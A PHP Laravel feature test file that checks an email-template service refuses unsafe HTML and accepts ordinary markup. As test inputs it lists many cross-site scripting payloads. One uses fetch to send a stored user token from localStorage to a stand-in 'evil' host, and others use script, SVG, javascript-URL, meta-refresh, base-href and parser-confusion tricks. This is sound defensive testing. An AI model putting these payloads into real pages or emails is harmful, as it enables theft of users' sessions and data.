<?php

namespace Tests\Feature;

use App\Models\Company;
use App\Models\EmailNotification;
use App\Models\EmailTemplate;
use App\Models\Location;
use App\Models\PhotoMessageTemplate;
use App\Models\User;
use App\Support\EmailHtml;
use Database\Seeders\DefaultEmailNotificationSeeder;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\Feature\Concerns\EventRegistrationFixtures;
use Tests\TestCase;

class EmailHtmlSafetyTest extends TestCase
{
    use RefreshDatabase;
    use EventRegistrationFixtures;

    private Company $company;

    private Location $brighton;

    private User $admin;

    private User $attendant;

    protected function setUp(): void
    {
        parent::setUp();

        $this->withoutMiddleware(\Illuminate\Routing\Middleware\ThrottleRequests::class);
        $this->company = $this->makeCompany('Zap Zone');
        $this->brighton = $this->makeVenue($this->company, 'Brighton');
        $this->admin = $this->makeStaff($this->company, $this->brighton, 'owner', 'company_admin');
        $this->attendant = $this->makeStaff($this->company, $this->brighton, 'desk', 'attendant');
    }

    public function test_unsafe_email_html_is_refused_wherever_bodies_are_saved(): void
    {
        $this->actAs($this->attendant);
        $this->postJson('/api/email-templates', ['name' => 'Hi', 'subject' => 'Hi', 'body' => '<p>Hi</p><img src=x onerror="fetch(\'//evil/?t=\'+localStorage.zapzone_user)">'])
            ->assertStatus(422)
            ->assertJsonValidationErrors('body');

        $template = EmailTemplate::create([
            'company_id' => $this->company->id,
            'location_id' => $this->brighton->id,
            'location_ids' => [$this->brighton->id],
            'created_by' => $this->attendant->id,
            'name' => 'Mine',
            'subject' => 'Mine',
            'body' => '<p>Mine</p>',
            'status' => 'draft',
        ]);
        $this->actAs($this->attendant);
        $this->putJson("/api/email-templates/{$template->id}", ['body' => '<a href=" jav&#x09;ascript:alert(1)">x</a>'])
            ->assertStatus(422)
            ->assertJsonValidationErrors('body');
        $this->assertSame('<p>Mine</p>', $template->fresh()->body);

        $this->actAs($this->admin);
        $this->postJson('/api/email-campaigns', [
            'name' => 'News',
            'subject' => 'News',
            'body' => '<svg onload="alert(1)"></svg>',
            'recipient_types' => ['custom'],
            'custom_emails' => ['someone@example.com'],
            'send_now' => false,
        ])->assertStatus(422)->assertJsonValidationErrors('body');

        $notification = [
            'name' => 'Alert',
            'trigger_type' => EmailNotification::TRIGGER_BOOKING_CONFIRMED,
            'entity_type' => EmailNotification::ENTITY_ALL,
            'recipient_types' => [EmailNotification::RECIPIENT_COMPANY_ADMIN],
            'subject' => 'Booked',
        ];
        $this->actAs($this->admin);
        $this->postJson('/api/email-notifications', $notification + ['body' => '<script>alert(1)</script>'])
            ->assertStatus(422)
            ->assertJsonValidationErrors('body');

        $this->actAs($this->admin);
        $id = $this->postJson('/api/email-notifications', $notification + ['body' => '<p>Booked</p>'])->assertCreated()->json('data.id');
        $this->actAs($this->admin);
        $this->putJson("/api/email-notifications/{$id}", ['body' => '<div style="width: expression(alert(1))">x</div>'])
            ->assertStatus(422)
            ->assertJsonValidationErrors('body');

        foreach ([
            '<IMG SRC=x ONERROR=alert(1)>',
            '<a href="JAVASCRIPT:alert(1)">x</a>',
            '<a href="data:text/html;base64,PHNjcmlwdD4=">x</a>',
            '<iframe srcdoc="<p>x</p>"></iframe>',
            '<meta http-equiv="refresh" content="0;url=https://evil.example">',
            '<object data="x.swf"></object>',
            '<p onmouseover = "alert(1)">x</p>',
            '<form><button formaction="javascript:alert(1)">x</button></form>',
            '<p>a</p><SCRIPT SRC=//evil></SCRIPT>',
            '<img/onerror=alert(1) src=x>',
            '<![CDATA[>]]><img src=x onerror=alert(1)>',
            '<!--><img src=x onerror=alert(1)>-->',
            '<math><mtext><img src=x onerror=alert(1)></mtext></math>',
            '<base href="https://evil.example/">',
        ] as $unsafe) {
            $this->assertNotNull(EmailHtml::problem($unsafe), $unsafe);
        }
    }

    public function test_test_campaign_emails_with_unsafe_html_are_refused(): void
    {
        $this->actAs($this->attendant);
        $this->postJson('/api/email-campaigns/send-test', [
            'subject' => 'Test',
            'body' => '<p>Hi</p><img src=x onerror="alert(1)">',
            'test_email' => 'someone@example.com',
        ])->assertStatus(422)->assertJsonValidationErrors('body');
    }

    public function test_ordinary_email_html_is_accepted(): void
    {
        $ordinary = '<html><head><meta charset="utf-8"><style>p { color: #111; }</style></head><body>'
            . '<h1>Hi {{ first_name }},</h1>'
            . '<p style="color: #3182ce; text-decoration: underline;"><a href="{{ photo_link }}" target="_blank">View your photos</a></p>'
            . '<table width="100%" cellpadding="0"><tr><td align="center" style="padding: 8px; background: url(https://cdn.example.com/bg.png)">Row</td></tr></table>'
            . '<p><a href="mailto:hello@example.com">Email us</a> or <a href="tel:+12485551234">call</a>.</p>'
            . '<p><a href="https://example.com/search?q=javascript:tips">Article about javascript: tips</a></p>'
            . '<img src="data:image/png;base64,iVBORw0KGgo=" alt="dot" style="max-width: 200px; height: auto;">'
            . '<p>{{ links }}</p><p>Questions? Reply to this email. One more line about onboarding = fun.</p>'
            . '</body></html>';

        $this->assertNull(EmailHtml::problem($ordinary));

        $this->actAs($this->admin);
        $this->postJson('/api/email-templates', ['name' => 'Fine', 'subject' => 'Fine', 'body' => $ordinary])
            ->assertCreated();
    }

    public function test_every_built_in_email_body_passes(): void
    {
        foreach (DefaultEmailNotificationSeeder::getDefaultDefinitions() as $definition) {
            $this->assertNull(EmailHtml::problem($definition['body']), $definition['name'] ?? $definition['default_key'] ?? 'default email');
        }

        foreach (PhotoMessageTemplate::KINDS as $kind) {
            $this->assertNull(EmailHtml::problem(PhotoMessageTemplate::defaultsFor($kind)['email_body'] ?? ''), $kind);
        }
    }
}
